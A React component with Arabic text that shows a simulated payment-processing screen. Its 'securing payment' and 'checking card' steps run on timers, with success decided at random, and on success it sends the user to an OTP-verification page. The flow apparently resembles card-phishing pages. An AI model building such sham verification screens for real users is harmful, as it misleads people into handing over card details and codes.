import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { Check, X, Loader2, Shield, CreditCard as CreditCardIcon } from "lucide-react";

const ProcessingPayment = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  
  const companyName = searchParams.get("company") || "";
  const price = searchParams.get("price") || "0";
  const cardLast4 = searchParams.get("cardLast4") || "";

  const [currentStep, setCurrentStep] = useState(0);
  const [isSuccess, setIsSuccess] = useState<boolean | null>(null);

  const steps = [
    { label: "يتم المعالجة", icon: Loader2 },
    { label: "يتم تأمين الدفعة", icon: Shield },
    { label: "يتم فحص البطاقة", icon: CreditCardIcon },
  ];

  useEffect(() => {
    const stepDuration = 1500; // 1.5 seconds per step
    
    const timers = steps.map((_, index) => 
      setTimeout(() => {
        setCurrentStep(index + 1);
      }, stepDuration * (index + 1))
    );

    // Simulate payment validation (90% success rate)
    const validationTimer = setTimeout(() => {
      const success = Math.random() > 0.1; // 90% success rate
      setIsSuccess(success);
      
      // Navigate after showing result
      setTimeout(() => {
        if (success) {
          navigate(`/otp-verification?company=${encodeURIComponent(companyName)}&price=${price}&cardLast4=${cardLast4}`);
        }
      }, 2000);
    }, stepDuration * steps.length + 500);

    return () => {
      timers.forEach(timer => clearTimeout(timer));
      clearTimeout(validationTimer);
    };
  }, [navigate, companyName, price, cardLast4]);

  return (
    <div className="min-h-screen bg-gradient-to-b from-primary to-primary-dark flex items-center justify-center p-4" dir="rtl">
      <div className="bg-white rounded-2xl shadow-2xl p-8 md:p-12 max-w-md w-full">
        <div className="text-center mb-8">
          <h1 className="text-2xl font-bold text-foreground mb-2">
            جاري معالجة الدفع
          </h1>
          <p className="text-muted-foreground">
            الرجاء الانتظار، لا تغلق هذه الصفحة
          </p>
        </div>

        <div className="space-y-6 mb-8">
          {steps.map((step, index) => {
            const Icon = step.icon;
            const isCompleted = currentStep > index;
            const isCurrent = currentStep === index;
            const isFailed = isSuccess === false && currentStep > steps.length;

            return (
              <div key={index} className="flex items-center gap-4">
                <div
                  className={`w-12 h-12 rounded-full flex items-center justify-center transition-all duration-500 ${
                    isCompleted && isSuccess !== false
                      ? "bg-green-500"
                      : isFailed && index === steps.length - 1
                      ? "bg-red-500"
                      : isCurrent
                      ? "bg-primary"
                      : "bg-muted"
                  }`}
                >
                  {isCompleted && isSuccess !== false ? (
                    <Check className="w-6 h-6 text-white" />
                  ) : isFailed && index === steps.length - 1 ? (
                    <X className="w-6 h-6 text-white" />
                  ) : isCurrent ? (
                    <Icon className="w-6 h-6 text-white animate-spin" />
                  ) : (
                    <Icon className="w-6 h-6 text-muted-foreground" />
                  )}
                </div>
                <div className="flex-1">
                  <p
                    className={`font-medium transition-all duration-500 ${
                      isCompleted || isCurrent
                        ? "text-foreground"
                        : "text-muted-foreground"
                    }`}
                  >
                    {step.label}
                  </p>
                </div>
              </div>
            );
          })}
        </div>

        {isSuccess === false && (
          <div className="bg-red-50 border border-red-200 rounded-lg p-4 text-center">
            <div className="w-16 h-16 bg-red-500 rounded-full flex items-center justify-center mx-auto mb-3">
              <X className="w-8 h-8 text-white" />
            </div>
            <h3 className="text-lg font-bold text-red-900 mb-2">فشلت عملية الدفع</h3>
            <p className="text-red-700 mb-4">
              حدث خطأ أثناء معالجة الدفع. الرجاء التحقق من بيانات البطاقة والمحاولة مرة أخرى.
            </p>
            <button
              onClick={() => navigate(-1)}
              className="bg-red-500 hover:bg-red-600 text-white px-6 py-2 rounded-lg font-medium transition-colors"
            >
              العودة للمحاولة مرة أخرى
            </button>
          </div>
        )}

        {isSuccess === true && currentStep > steps.length && (
          <div className="bg-green-50 border border-green-200 rounded-lg p-4 text-center">
            <div className="w-16 h-16 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-3">
              <Check className="w-8 h-8 text-white" />
            </div>
            <h3 className="text-lg font-bold text-green-900 mb-2">تم التحقق بنجاح</h3>
            <p className="text-green-700">
              جاري التحويل لصفحة التحقق...
            </p>
          </div>
        )}
      </div>
    </div>
  );
};

export default ProcessingPayment;
